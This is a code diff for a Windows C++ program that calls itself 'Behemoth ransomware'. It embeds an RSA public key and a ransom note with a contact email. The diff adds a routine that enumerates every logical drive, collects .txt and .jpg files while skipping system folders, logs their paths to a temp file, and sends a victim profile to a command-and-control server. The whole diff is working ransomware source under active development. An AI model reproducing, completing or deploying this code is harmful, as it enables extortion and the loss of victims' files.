@@ -19,10 +19,11 @@
 #include "Helpers/desktop_path.h"
 #include "Helpers/profiler.h"
 #include "Communication/sendrequest.h"
+#include "Helpers/line_count.hpp"
 
 
-const std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
-const std::string OFF_README = "Your files has been encrypted with Behemoth ransomware.\n\nThe file hash for this executable is XXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\nConstant us at constant@c0nstant.ca with the executable's hash to decrypt your files.\n";
+std::string PUBLIC_KEY = "MIIBojANBgkqhkiG9w0BAQEFAAOCAY8AMIIBigKCAYEAydGwvuurofZFGQD6mDYPjq4JJDLGjiSBREcqAhb/2+njKYcJw4yyJlicn/vhDpiwoar2tMK0Ry1tY44hWjbrVBYNM+dav8qiTj9KtHyI9iZwqmZNU9hhlpKcYiirCYhS9d4GqDBTe/GciueB5rcI/0s8UAtkrHprJLGWHFo1RgooJxRcKnxhOS3Em+PYsenlrLgeCKKMMzn896pG5J6SI7K+bamgTu9d6Xi01ZFtN5glIQGspZd0guJOkVN2Gf0Lp8Yq/KA9rGQv7G8SlyQbyssDPVDXz/5fHuYOVedlseFllkNKEqfCPcvgp/Jrmr3h4D3s8avhrzAP2wJUXqRR+YwFLYHkglJ/zVubPqgtAJrb5VnbZeMLhyILbfEV8CW8ydpYMsmSeWuSFDz7z9Bg7EE6EFCZ4qx6vIzgNg/GOMsUyyarztnf/N9T2QWXbcex6/+c34kNO3y8aay1xkK8AAvk8bkOBWIEDS7bvJ7c0CYkZZehqSCJ/vkr706Ye27HAgMBAAE=";
+std::string OFF_README = "Your files has been encrypted with Behemoth ransomware.\n\nThe file hash for this executable is XXXXXXXXXXXXXXXXXXXXXXXXXXXX\n\nConstant us at constant@c0nstant.ca with the executable's hash to decrypt your files.\n";
 bool OFFLINE_ENC = false;
 bool ONLINE_ENC = true;
 
@@ -48,11 +49,42 @@ int main() {
 
 
 int online_enc() {
-    nlohmann::json profileJson = profiler(1337);
-    std::cout << profileJson.dump(4) << std::endl;
+    // Identify all drives
+    std::map<std::string, std::vector<std::wstring>> drives = Disk_ID();
+    // Store all logical drives to an array
+    std::vector<std::wstring> logicalDrives = drives["logical"];
 
+    // Generate a unique wstring:
+    std::string randomTempStr = gen_str(8);
+    std::wstring randomWStr(randomTempStr.begin(), randomTempStr.end());
+
+    // Path to temp directory
+    WCHAR tempPath[MAX_PATH];
+    GetTempPath(MAX_PATH, tempPath);
+    std::wstring wstrTempPath(tempPath);
+    // Path to a text file for storing file paths
+    std::wstring filePath = wstrTempPath + L"\\" + randomWStr + L".txt";
+
+
+    // Search for files in each drive & ignore forbidden folders 
+    std::vector<std::wstring> fileTypes = { L".txt", L".jpg" };
+    std::unordered_set<std::wstring> forbiddenDirs = { L"System Volume Information", L"Windows", L"Program Files", L"Users",
+                                                        L"PerfLogs", L"Recovery", L"Path", L"Program Files (x86)", L"$Recycle.Bin" };
+
+    for (const auto& drive : logicalDrives) {
+        std::vector<std::wstring> files = FileSearcher(drive, fileTypes, forbiddenDirs);
+        SaveResultsToFile(filePath, files);
+    }
+
+
+    // set value for total number of writable files
+    std::string filesCount = countNonEmptyLines(filePath);
+    // send profile to c2
+    nlohmann::json profileJson = profiler(filesCount);
+    std::cout << profileJson.dump(4) << std::endl;
     std::string response = sendrequest(L"https://10.0.0.113:5000/new-user", profileJson);
-    std::cout << response << std::endl;
+
+    
 
     return 0;
 }
